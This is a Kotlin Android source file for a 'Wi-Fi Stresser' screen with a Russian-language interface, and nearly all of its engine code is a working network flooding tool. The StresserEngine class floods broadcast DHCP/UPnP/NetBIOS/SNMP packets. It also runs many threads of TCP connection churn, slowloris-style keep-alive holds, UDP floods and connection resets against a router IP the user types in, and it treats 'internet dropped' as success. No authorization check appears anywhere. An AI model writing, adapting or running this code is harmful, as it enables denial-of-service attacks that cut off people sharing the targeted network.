package com.toolkit.app

import android.os.Handler
import android.os.Looper
import androidx.activity.compose.BackHandler
import androidx.compose.animation.core.RepeatMode
import androidx.compose.animation.core.animateFloat
import androidx.compose.animation.core.infiniteRepeatable
import androidx.compose.animation.core.rememberInfiniteTransition
import androidx.compose.animation.core.tween
import androidx.compose.foundation.Canvas
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.lazy.rememberLazyListState
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.text.KeyboardActions
import androidx.compose.foundation.text.KeyboardOptions
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.ArrowBack
import androidx.compose.material3.Button
import androidx.compose.material3.ButtonDefaults
import androidx.compose.material3.Icon
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.OutlinedTextField
import androidx.compose.material3.OutlinedTextFieldDefaults
import androidx.compose.material3.Text
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.alpha
import androidx.compose.ui.draw.clip
import androidx.compose.ui.geometry.Offset
import androidx.compose.ui.graphics.Brush
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.Path
import androidx.compose.ui.graphics.StrokeCap
import androidx.compose.ui.graphics.drawscope.Fill
import androidx.compose.ui.graphics.drawscope.Stroke
import androidx.compose.ui.text.AnnotatedString
import androidx.compose.ui.text.TextStyle
import androidx.compose.ui.text.drawText
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.input.ImeAction
import androidx.compose.ui.text.input.KeyboardType
import androidx.compose.ui.text.rememberTextMeasurer
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.toolkit.app.ui.Accent
import com.toolkit.app.ui.AccentSoft
import com.toolkit.app.ui.BorderGlass
import com.toolkit.app.ui.GlassCard
import com.toolkit.app.ui.OkGreen
import com.toolkit.app.ui.TextDim
import com.toolkit.app.ui.TextMain
import com.toolkit.app.ui.WarnOrange
import java.net.DatagramPacket
import java.net.DatagramSocket
import java.net.InetSocketAddress
import java.net.Socket
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicInteger
import java.util.concurrent.atomic.AtomicLong
import kotlin.concurrent.thread
import kotlin.math.max
import kotlin.math.min

data class StresserSnapshot(
    val downKBs: Float = 0f,
    val upKBs: Float = 0f,
    val pingMs: Float = 0f,
    val liveConns: Int = 0,
    val okRate: Float = 100f,
    val dropped: Boolean = false,
)

class StresserEngine(
    private val host: String,
    private val method: Int = 2,
    private val onMetrics: (StresserSnapshot) -> Unit,
    private val onLog: (String, Color) -> Unit,
    private val onDrop: () -> Unit,
) {
    private val running = AtomicBoolean(false)
    private val sent = AtomicLong(0)
    private val recv = AtomicLong(0)
    private val live = AtomicInteger(0)
    private val okCount = AtomicLong(0)
    private val failCount = AtomicLong(0)
    private val pingFails = AtomicInteger(0)
    @Volatile var lastPing = 0f
        private set
    @Volatile var dropped = false
        private set
    val pingHistory: List<Float>
        get() = synchronized(historyLock) { ArrayList(history) }
    private val historyLock = Any()
    private val history = ArrayList<Float>()
    private val pool = Collections.synchronizedSet(HashSet<Socket>())
    private val workers = ArrayList<Thread>()

    fun start() {
        if (running.getAndSet(true)) return
        onLog(
            if (method == 1) {
                "Метод 1: broadcast-флуд (DHCP/UPnP/NetBIOS/SNMP), цель $host"
            } else {
                "Метод 2: TCP/UDP-флуд, цель $host:80"
            },
            Accent,
        )
        fun go(block: () -> Unit) {
            val t = thread(isDaemon = true, name = "stress-worker") {
                try {
                    block()
                } catch (t: Throwable) {
                    failCount.incrementAndGet()
                }
            }
            workers.add(t)
        }
        if (method == 1) {
            for (i in 0 until 8) go { broadcastWorker(67, ::dhcpPacket) }
            for (i in 0 until 8) go { broadcastWorker(1900, ::upnpMsg) }
            for (i in 0 until 8) go { broadcastWorker(137, ::netbiosQuery) }
            for (i in 0 until 8) go { broadcastWorker(161, ::snmpPdu) }
        } else {
            for (i in 0 until 20) go { churnWorker() }
            for (i in 0 until 8) go { keepAliveWorker() }
            for (i in 0 until 10) go { udpWorker(53) }
            for (i in 0 until 10) go { udpWorker(67) }
            for (i in 0 until 24) go { rstWorker() }
            for (i in 0 until 8) go { downloadWorker() }
        }
        go { pingLoop() }
        go { snapshotLoop() }
    }

    fun stop() {
        if (!running.getAndSet(false)) return
        onLog("Останавливаю…", WarnOrange)
        synchronized(pool) {
            pool.forEach { runCatching { it.close() } }
            pool.clear()
        }
        workers.forEach { runCatching { it.join(1500) } }
        workers.clear()
        onLog("Стрессер остановлен", OkGreen)
    }

    private fun tcpConnect(): Socket? {
        synchronized(pool) {
            if (pool.size >= 250) {
                Thread.sleep(50)
                return null
            }
        }
        return try {
            val s = Socket()
            s.tcpNoDelay = true
            s.connect(InetSocketAddress(host, 80), 3500)
            live.incrementAndGet()
            okCount.incrementAndGet()
            synchronized(pool) { pool.add(s) }
            s
        } catch (e: Throwable) {
            failCount.incrementAndGet()
            null
        }
    }

    private fun release(s: Socket?) {
        if (s == null) return
        runCatching { s.close() }
        synchronized(pool) { pool.remove(s) }
        live.decrementAndGet()
    }

    private fun churnWorker() {
        while (running.get()) {
            val s = tcpConnect()
            if (s != null) {
                try {
                    val q = Random().nextInt(999999)
                    val head = "GET /?$q HTTP/1.1\r\n" +
                        "Host: $host\r\n" +
                        "User-Agent: Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36\r\n" +
                        "Accept: text/html,*/*;q=0.8\r\n" +
                        "Connection: Keep-Alive\r\n" +
                        "X-Speed: ${Random().nextInt(9999)}\r\n\r\n"
                    val b = head.toByteArray()
                    s.getOutputStream().write(b)
                    sent.addAndGet(b.size.toLong())
                    s.soTimeout = 1500
                    val buf = ByteArray(4096)
                    val got = s.getInputStream().read(buf)
                    if (got > 0) recv.addAndGet(got.toLong())
                } catch (t: Throwable) {
                    failCount.incrementAndGet()
                } finally {
                    release(s)
                }
            }
        }
    }

    private fun keepAliveWorker() {
        while (running.get()) {
            val s = tcpConnect()
            if (s != null) {
                try {
                    val head = "GET /?KA=${Random().nextInt(999999)} HTTP/1.1\r\nHost: $host\r\n" +
                        "User-Agent: Stresser/1.0\r\nConnection: Keep-Alive\r\nKeep-Alive: 300\r\n\r\n"
                    val b = head.toByteArray()
                    s.getOutputStream().write(b)
                    sent.addAndGet(b.size.toLong())
                    s.soTimeout = 20000
                    val buf = ByteArray(1024)
                    var last = System.currentTimeMillis()
                    while (running.get()) {
                        val now = System.currentTimeMillis()
                        if (now - last > 6000) {
                            val ping = "X-ignore: ${Random().nextInt(9999)}\r\n".toByteArray()
                            s.getOutputStream().write(ping)
                            sent.addAndGet(ping.size.toLong())
                            last = now
                        }
                        val got = s.getInputStream().read(buf)
                        if (got <= 0) break
                        recv.addAndGet(got.toLong())
                    }
                } catch (t: Throwable) {
                    failCount.incrementAndGet()
                } finally {
                    release(s)
                }
            }
        }
    }

    private fun udpWorker(port: Int) {
        val s = DatagramSocket()
        val p = ByteArray(1400)
        Random().nextBytes(p)
        while (running.get()) {
            try {
                s.send(DatagramPacket(p, p.size, InetSocketAddress(host, port)))
                sent.addAndGet(p.size.toLong())
            } catch (t: Throwable) {
            }
        }
        runCatching { s.close() }
    }

    private fun broadcastWorker(port: Int, packet: () -> ByteArray) {
        val s = DatagramSocket()
        runCatching { s.broadcast = true }
        while (running.get()) {
            try {
                val p = packet()
                s.send(DatagramPacket(p, p.size, InetSocketAddress("255.255.255.255", port)))
                sent.addAndGet(p.size.toLong())
            } catch (t: Throwable) {
            }
        }
        runCatching { s.close() }
    }

    private fun dhcpPacket(): ByteArray {
        val xid = Random().nextInt()
        val p = ByteArray(28)
        p[0] = 0x01
        p[1] = 0x01
        p[2] = 0x06
        p[3] = 0x00
        p[4] = (xid ushr 24).toByte()
        p[5] = (xid ushr 16).toByte()
        p[6] = (xid ushr 8).toByte()
        p[7] = xid.toByte()
        val rand = ByteArray(20)
        Random().nextBytes(rand)
        System.arraycopy(rand, 0, p, 8, 20)
        return p
    }

    private fun upnpMsg(): ByteArray = "M-SEARCH * HTTP/1.1\r\n" +
        "HOST: 239.255.255.250:1900\r\n" +
        "MAN: \"ssdp:discover\"\r\n" +
        "MX: 1\r\n" +
        "ST: ssdp:all\r\n\r\n".toByteArray()

    private fun netbiosQuery(): ByteArray = byteArrayOf(
        0x00, 0x00, 0x00, 0x10, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x20, 0x43, 0x4b,
        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
        0x00, 0x00, 0x21, 0x00, 0x01,
    )

    private fun snmpPdu(): ByteArray = byteArrayOf(
        0x30, 0x26, 0x02, 0x01, 0x00, 0x04, 0x06,
    ) + "public".toByteArray() + byteArrayOf(
        0xa0, 0x1b, 0x02, 0x01, 0x2a, 0x02, 0x01, 0x00, 0x02, 0x01, 0x00,
        0x30, 0x0f, 0x30, 0x0d, 0x06, 0x09, 0x2b, 0x06, 0x01, 0x02, 0x01, 0x01, 0x01, 0x00,
        0x05, 0x00,
    )

    private fun rstWorker() {
        while (running.get()) {
            val s = tcpConnect()
            if (s != null) {
                try {
                    val b = "GET / HTTP/1.0\r\n\r\n".toByteArray()
                    s.getOutputStream().write(b)
                    sent.addAndGet(b.size.toLong())
                    s.setSoLinger(true, 0)
                } catch (t: Throwable) {
                    failCount.incrementAndGet()
                } finally {
                    release(s)
                }
            }
        }
    }

    private fun downloadWorker() {
        while (running.get()) {
            val s = tcpConnect()
            if (s != null) {
                try {
                    val b = "GET / HTTP/1.0\r\nHost: $host\r\nUser-Agent: SpeedTest/1.0\r\n\r\n".toByteArray()
                    s.getOutputStream().write(b)
                    sent.addAndGet(b.size.toLong())
                    s.soTimeout = 2500
                    val buf = ByteArray(16384)
                    while (running.get()) {
                        val got = s.getInputStream().read(buf)
                        if (got <= 0) break
                        recv.addAndGet(got.toLong())
                    }
                } catch (t: Throwable) {
                    failCount.incrementAndGet()
                } finally {
                    release(s)
                }
            }
        }
    }

    private fun pingLoop() {
        while (running.get()) {
            val t0 = System.currentTimeMillis()
            var ok = false
            var s: Socket? = null
            try {
                s = Socket()
                s.tcpNoDelay = true
                s.connect(InetSocketAddress(host, 80), 2500)
                ok = true
            } catch (t: Throwable) {
            } finally {
                runCatching { s?.close() }
            }
            val ms = (System.currentTimeMillis() - t0).toFloat()
            synchronized(historyLock) {
                if (ok) {
                    pingFails.set(0)
                    lastPing = ms
                    history.add(ms)
                } else {
                    val f = pingFails.incrementAndGet()
                    if (f >= 2) {
                        val was = dropped
                        dropped = true
                        if (!was) onDrop()
                    }
                    history.add(-1f)
                }
                if (history.size > 90) history.removeAt(0)
            }
            Thread.sleep(1000)
        }
    }

    private fun snapshotLoop() {
        var lastSent = 0L
        var lastRecv = 0L
        while (running.get()) {
            val s = sent.get()
            val r = recv.get()
            val ok = okCount.get()
            val fail = failCount.get()
            val total = ok + fail
            val pings = pingHistory
            val lastGood = pings.filter { it >= 0 }.lastOrNull() ?: lastPing
            onMetrics(
                StresserSnapshot(
                    downKBs = (r - lastRecv) / 1024f,
                    upKBs = (s - lastSent) / 1024f,
                    pingMs = if (lastGood >= 0) lastGood else 0f,
                    liveConns = live.get(),
                    okRate = if (total > 0) ok * 100f / total else 100f,
                    dropped = dropped,
                )
            )
            lastSent = s
            lastRecv = r
            Thread.sleep(1000)
        }
    }
}

@Composable
fun WifiIcon(modifier: Modifier, color: Color, animated: Boolean = false) {
    val alpha = if (animated) {
        val t = rememberInfiniteTransition(label = "wifi")
        val a = t.animateFloat(
            initialValue = 0.35f,
            targetValue = 1f,
            animationSpec = infiniteRepeatable(tween(700), RepeatMode.Reverse),
            label = "pulse",
        )
        a.value
    } else 1f
    Canvas(modifier = modifier) {
        val cx = size.width / 2f
        val cy = size.height * 0.62f
        val r1 = size.minDimension * 0.13f
        val r2 = r1 * 1.95f
        val r3 = r2 * 1.6f
        val start = 202.5f
        val sweep = 315f
        val strokeStyle = Stroke(width = size.minDimension * 0.085f, cap = StrokeCap.Round)
        drawArc(color.copy(alpha = alpha), start, sweep, false, topLeft = Offset(cx - r3, cy - r3), size = androidx.compose.ui.geometry.Size(r3 * 2, r3 * 2), style = strokeStyle)
        drawArc(color.copy(alpha = alpha * 0.85f), start, sweep, false, topLeft = Offset(cx - r2, cy - r2), size = androidx.compose.ui.geometry.Size(r2 * 2, r2 * 2), style = strokeStyle)
        drawArc(color.copy(alpha = alpha * 0.7f), start, sweep, false, topLeft = Offset(cx - r1, cy - r1), size = androidx.compose.ui.geometry.Size(r1 * 2, r1 * 2), style = strokeStyle)
        drawCircle(color, radius = r1 * 0.62f, center = Offset(cx, cy))
    }
}

private data class LogLine(val text: String, val color: Color)

@Composable
fun WifiStresserScreen(onBack: () -> Unit) {
    var ip by remember { mutableStateOf("192.168.0.1") }
    var method by remember { mutableStateOf(1) }
    var running by remember { mutableStateOf(false) }
    var snap by remember { mutableStateOf(StresserSnapshot()) }
    val logs = remember { mutableStateListOf<LogLine>() }
    val listState = rememberLazyListState()
    val engine = remember { mutableStateOf<StresserEngine?>(null) }
    val wasDropped = remember { mutableStateOf(false) }
    val pingSpiked = remember { mutableStateOf(false) }

    BackHandler(enabled = true, onBack = onBack)

    fun addLog(text: String, color: Color = TextDim) {
        val ts = SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date())
        logs.add(LogLine("[$ts] $text", color))
        if (logs.size > 80) logs.removeAt(0)
    }

    LaunchedEffect(logs.size) {
        if (logs.isNotEmpty()) runCatching { listState.scrollToItem(logs.size - 1) }
    }

    fun stopStresser() {
        running = false
        engine.value?.stop()
        engine.value = null
    }

    fun startStresser() {
        val h = ip.trim()
        if (!Regex("^\\d{1,3}(\\.\\d{1,3}){3}\$").matches(h)) {
            addLog("Некорректный IP-адрес: $h", WarnOrange)
            return
        }
        logs.clear()
        wasDropped.value = false
        pingSpiked.value = false
        val ui = Handler(Looper.getMainLooper())
        val e = StresserEngine(
            host = h,
            method = method,
            onMetrics = { m ->
                ui.post {
                    snap = m
                    if (!m.dropped) wasDropped.value = false
                    if (m.pingMs > 1000 && !pingSpiked.value) {
                        pingSpiked.value = true
                        addLog("Пинг подскочил: ${m.pingMs.toInt()} мс", WarnOrange)
                    } else if (m.pingMs < 400 && pingSpiked.value) {
                        pingSpiked.value = false
                    }
                }
            },
            onLog = { text, color -> ui.post { addLog(text, color) } },
            onDrop = {
                ui.post {
                    wasDropped.value = true
                    addLog("Интернет упал! Нет ответа от роутера", Color(0xFFFF6B6B))
                }
            },
        )
        engine.value = e
        running = true
        addLog("Подключение к сети…", AccentSoft)
        e.start()
    }

    Column(
        modifier = Modifier
            .fillMaxSize()
            .verticalScroll(rememberScrollState())
            .padding(horizontal = 20.dp, vertical = 18.dp),
    ) {
        Row(verticalAlignment = Alignment.CenterVertically) {
            Box(
                modifier = Modifier
                    .size(40.dp)
                    .clip(CircleShape)
                    .clickable(onClick = onBack),
                contentAlignment = Alignment.Center,
            ) {
                Icon(
                    Icons.AutoMirrored.Filled.ArrowBack,
                    contentDescription = "Назад",
                    tint = TextMain,
                    modifier = Modifier.size(22.dp),
                )
            }
            Spacer(Modifier.width(6.dp))
            Text(
                "Wi-Fi Stresser",
                color = TextMain,
                fontSize = 22.sp,
                fontWeight = FontWeight.Bold,
            )
            Spacer(Modifier.weight(1f))
            WifiIcon(
                modifier = Modifier.size(30.dp),
                color = if (running) AccentSoft else Accent,
                animated = running,
            )
        }

        Spacer(Modifier.height(14.dp))
        GlassCard(modifier = Modifier.fillMaxWidth()) {
            Column(Modifier.padding(16.dp)) {
                Text(
                    "Стрессируем Wi-Fi. Требуется IP-адрес роутера — есть в настройках сети, " +
                        "чаще всего в разделе «Шлюз» или «DNS» (цифры вида 192.168.0.1 или 192.168.1.1, " +
                        "у всех разные). Работает без root-прав. Нужно быть подключённым к той сети, " +
                        "которую вы собираетесь стрессировать.",
                    color = TextDim,
                    fontSize = 13.sp,
                    lineHeight = 18.sp,
                )
            }
        }

        Spacer(Modifier.height(12.dp))
        Row(Modifier.fillMaxWidth()) {
            MethodButton(
                modifier = Modifier.weight(1f),
                title = "Метод 1",
                subtitle = "broadcast-флуд",
                selected = method == 1,
                enabled = !running,
                onClick = { method = 1 },
            )
            Spacer(Modifier.width(8.dp))
            MethodButton(
                modifier = Modifier.weight(1f),
                title = "Метод 2",
                subtitle = "TCP/UDP-флуд",
                selected = method == 2,
                enabled = !running,
                onClick = { method = 2 },
            )
        }

        Spacer(Modifier.height(12.dp))
        GlassCard(modifier = Modifier.fillMaxWidth()) {
            Row(
                modifier = Modifier.padding(14.dp),
                verticalAlignment = Alignment.CenterVertically,
            ) {
                OutlinedTextField(
                    value = ip,
                    onValueChange = { ip = it },
                    modifier = Modifier.weight(1f),
                    singleLine = true,
                    label = { Text("IP роутера", color = TextDim, fontSize = 13.sp) },
                    textStyle = MaterialTheme.typography.bodyLarge.copy(
                        color = TextMain,
                        fontSize = 16.sp,
                        fontFamily = FontFamily.Monospace,
                    ),
                    keyboardOptions = KeyboardOptions(
                        keyboardType = KeyboardType.Number,
                        imeAction = ImeAction.Done,
                    ),
                    keyboardActions = KeyboardActions(onDone = { if (!running) startStresser() }),
                    shape = RoundedCornerShape(14.dp),
                    colors = OutlinedTextFieldDefaults.colors(
                        focusedBorderColor = Accent,
                        unfocusedBorderColor = BorderGlass,
                        focusedTextColor = TextMain,
                        cursorColor = Accent,
                        focusedLabelColor = AccentSoft,
                    ),
                )
                Spacer(Modifier.width(12.dp))
                Button(
                    onClick = { if (running) stopStresser() else startStresser() },
                    colors = ButtonDefaults.buttonColors(
                        containerColor = if (running) Color(0xFFB3261E) else Accent,
                        contentColor = if (running) Color.White else Color(0xFF0E1013),
                    ),
                    shape = RoundedCornerShape(14.dp),
                    modifier = Modifier.height(54.dp),
                ) {
                    Text(
                        if (running) "СТОП" else "СТАРТ",
                        fontSize = 14.sp,
                        fontWeight = FontWeight.Bold,
                        letterSpacing = 1.sp,
                    )
                }
            }
        }

        Spacer(Modifier.height(12.dp))
        Row(Modifier.fillMaxWidth()) {
            StatTile(Modifier.weight(1f), "Скачивание", speedStr(snap.downKBs))
            Spacer(Modifier.width(8.dp))
            StatTile(Modifier.weight(1f), "Отдача", speedStr(snap.upKBs))
            Spacer(Modifier.width(8.dp))
            StatTile(Modifier.weight(1f), "Пинг", if (snap.pingMs > 0) "${snap.pingMs.toInt()} мс" else "—")
            Spacer(Modifier.width(8.dp))
            StatTile(Modifier.weight(1f), "Соединения", "${snap.liveConns}")
        }

        Spacer(Modifier.height(12.dp))
        GlassCard(modifier = Modifier.fillMaxWidth()) {
            Column(Modifier.padding(14.dp)) {
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Text(
                        "Интернет в реальном времени",
                        color = TextMain,
                        fontSize = 14.sp,
                        fontWeight = FontWeight.SemiBold,
                    )
                    Spacer(Modifier.weight(1f))
                    if (snap.dropped) {
                        Text("НЕТ ИНТЕРНЕТА", color = Color(0xFFFF6B6B), fontSize = 11.sp, fontWeight = FontWeight.Bold)
                    } else {
                        Text(
                            "Успех ${snap.okRate.toInt()}%",
                            color = if (snap.okRate > 80) OkGreen else WarnOrange,
                            fontSize = 11.sp,
                            fontWeight = FontWeight.Bold,
                        )
                    }
                }
                Spacer(Modifier.height(8.dp))
                LatencyGraph(engine.value?.pingHistory)
                Spacer(Modifier.height(4.dp))
                Row {
                    Box(Modifier.size(8.dp).clip(CircleShape).background(Accent))
                    Spacer(Modifier.width(6.dp))
                    Text("пинг", color = TextDim, fontSize = 11.sp)
                    Spacer(Modifier.width(14.dp))
                    Box(Modifier.size(8.dp).clip(CircleShape).background(Color(0xFFFF6B6B)))
                    Spacer(Modifier.width(6.dp))
                    Text("обрыв связи", color = TextDim, fontSize = 11.sp)
                }
            }
        }

        Spacer(Modifier.height(12.dp))
        GlassCard(modifier = Modifier.fillMaxWidth()) {
            Column(Modifier.padding(14.dp)) {
                Text("Логи", color = TextMain, fontSize = 14.sp, fontWeight = FontWeight.SemiBold)
                Spacer(Modifier.height(6.dp))
                if (logs.isEmpty()) {
                    Text(
                        "Запустите стрессер — здесь появится лог.",
                        color = TextDim,
                        fontSize = 12.sp,
                    )
                } else {
                    LazyColumn(
                        state = listState,
                        modifier = Modifier
                            .fillMaxWidth()
                            .height(180.dp),
                    ) {
                        items(logs.size) { i ->
                            val l = logs[i]
                            Text(
                                l.text,
                                color = l.color,
                                fontFamily = FontFamily.Monospace,
                                fontSize = 12.sp,
                                lineHeight = 16.sp,
                            )
                        }
                    }
                }
            }
        }
    }
}

@Composable
private fun MethodButton(
    modifier: Modifier,
    title: String,
    subtitle: String,
    selected: Boolean,
    enabled: Boolean,
    onClick: () -> Unit,
) {
    Box(
        modifier = modifier
            .clip(RoundedCornerShape(16.dp))
            .background(
                when {
                    selected -> Accent.copy(alpha = 0.16f)
                    else -> Color(0x12FFFFFF)
                }
            )
            .border(
                width = if (selected) 1.5.dp else 0.dp,
                color = if (selected) Accent else Color.Transparent,
                shape = RoundedCornerShape(16.dp),
            )
            .alpha(if (enabled) 1f else 0.6f)
            .clickable(enabled = enabled, onClick = onClick),
    ) {
        Column(Modifier.padding(horizontal = 14.dp, vertical = 12.dp)) {
            Text(
                title,
                color = if (selected) Accent else TextMain,
                fontSize = 14.sp,
                fontWeight = FontWeight.Bold,
            )
            Text(
                subtitle,
                color = TextDim,
                fontSize = 10.sp,
                maxLines = 1,
            )
        }
    }
}

@Composable
private fun StatTile(modifier: Modifier, label: String, value: String) {
    GlassCard(modifier = modifier) {
        Column(
            Modifier
                .fillMaxWidth()
                .height(58.dp),
            horizontalAlignment = Alignment.CenterHorizontally,
            verticalArrangement = Arrangement.Center,
        ) {
            Text(label, color = TextDim, fontSize = 10.sp, maxLines = 1)
            Spacer(Modifier.height(3.dp))
            Text(
                value,
                color = TextMain,
                fontSize = 12.sp,
                fontWeight = FontWeight.SemiBold,
                fontFamily = FontFamily.Monospace,
                maxLines = 1,
                softWrap = false,
                overflow = androidx.compose.ui.text.style.TextOverflow.Clip,
                modifier = Modifier.padding(horizontal = 4.dp),
            )
        }
    }
}

private fun speedStr(kbs: Float): String {
    if (kbs <= 0f) return "0 КБ/с"
    if (kbs >= 1024f) return "%.1f МБ/с".format(Locale.US, kbs / 1024f)
    return "${kbs.toInt()} КБ/с"
}

@Composable
private fun LatencyGraph(history: List<Float>?) {
    val textMeasurer = rememberTextMeasurer()
    val labelStyle = TextStyle(color = TextDim, fontSize = 9.sp)
    Canvas(
        modifier = Modifier
            .fillMaxWidth()
            .height(140.dp),
    ) {
        val pts = history ?: return@Canvas
        val n = pts.size
        val w = size.width
        val h = size.height
        if (n == 0) {
            drawLine(BorderGlass, Offset(0f, h / 2f), Offset(w, h / 2f), strokeWidth = 1.5f)
            return@Canvas
        }
        val from = max(0, n - 60)
        val data = pts.subList(from, n)
        val goodMax = data.filter { it >= 0 }.maxOrNull()
        val maxV = max(50f, goodMax ?: 50f) * 1.15f
        fun xAt(i: Int) = w * (from + i) / 59f
        fun yAt(v: Float) = h - (min(v, maxV) / maxV) * h

        for (g in 0..4) {
            val y = h - h * g / 4f
            drawLine(
                if (g == 0) BorderGlass.copy(alpha = 0.5f) else BorderGlass,
                Offset(0f, y),
                Offset(w, y),
                strokeWidth = if (g == 0) 1.5f else 1f,
            )
            val label = textMeasurer.measure(
                AnnotatedString("${(maxV * g / 4f).toInt()} мс"),
                labelStyle,
            )
            drawText(label, topLeft = Offset(5.dp.toPx(), y - label.size.height - 2.dp.toPx()))
        }
        val timeLabel = textMeasurer.measure(AnnotatedString("60 с"), labelStyle)
        drawText(timeLabel, topLeft = Offset(w - timeLabel.size.width - 5.dp.toPx(), h - timeLabel.size.height - 2.dp.toPx()))

        val goodPts = ArrayList<Offset>(data.size)
        val dropXs = ArrayList<Float>(4)
        data.forEachIndexed { i, v ->
            val x = xAt(i)
            if (v >= 0) goodPts.add(Offset(x, yAt(v))) else dropXs.add(x)
        }

        if (goodPts.isNotEmpty()) {
            val line = Path()
            line.moveTo(goodPts[0].x, goodPts[0].y)
            if (goodPts.size >= 2) {
                for (i in 1 until goodPts.size - 1) {
                    val midX = (goodPts[i].x + goodPts[i + 1].x) / 2f
                    val midY = (goodPts[i].y + goodPts[i + 1].y) / 2f
                    line.quadraticBezierTo(goodPts[i].x, goodPts[i].y, midX, midY)
                }
                line.lineTo(goodPts.last().x, goodPts.last().y)
            }
            val area = Path()
            area.moveTo(goodPts[0].x, h)
            if (goodPts.size >= 2) {
                area.lineTo(goodPts[0].x, goodPts[0].y)
                for (i in 1 until goodPts.size - 1) {
                    val midX = (goodPts[i].x + goodPts[i + 1].x) / 2f
                    val midY = (goodPts[i].y + goodPts[i + 1].y) / 2f
                    area.quadraticBezierTo(goodPts[i].x, goodPts[i].y, midX, midY)
                }
                area.lineTo(goodPts.last().x, goodPts.last().y)
            } else {
                area.lineTo(goodPts[0].x, goodPts[0].y)
            }
            area.lineTo(goodPts.last().x, h)
            area.close()
            drawPath(
                area,
                Brush.verticalGradient(
                    listOf(Accent.copy(alpha = 0.22f), Color.Transparent),
                    startY = 0f,
                    endY = h,
                ),
                style = Fill,
            )
            drawPath(line, Accent, style = Stroke(width = 2.dp.toPx(), cap = StrokeCap.Round, join = androidx.compose.ui.graphics.StrokeJoin.Round))
        }

        dropXs.forEach { x ->
            drawLine(
                Color(0xFFFF6B6B).copy(alpha = 0.5f),
                Offset(x, 0f),
                Offset(x, h),
                strokeWidth = 1.5f,
            )
            drawCircle(Color(0xFFFF6B6B), radius = 3.5.dp.toPx(), center = Offset(x, h - 10.dp.toPx()))
        }

        val last = data.lastOrNull()
        if (last != null && last >= 0) {
            drawCircle(AccentSoft, radius = 4.dp.toPx(), center = Offset(xAt(from + data.size - 1), yAt(last)))
        }
    }
}
